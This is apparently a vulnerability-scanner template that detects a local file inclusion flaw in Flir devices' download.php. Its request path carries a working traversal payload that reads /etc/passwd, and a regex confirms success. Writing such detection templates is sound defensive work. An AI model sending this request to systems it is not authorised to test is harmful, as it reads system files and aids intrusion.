id: "flir-path-traversal"
name: "Flir - Local File Inclusion"
severity: "high"
description: "Flir is vulnerable to local file inclusion."
tech:
  - "php"
tags:
  - "flir"
  - "lfi"
  - "vuln"
cwe: "CWE-22"
reference: "https://juejin.cn/post/6961370156484263972"
spaExclusion: true
request:
  method: "GET"
  path: "/download.php?file=/etc/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:.*:0:0:"
    condition: "and"
  - type: "status"
    status:
      - 200
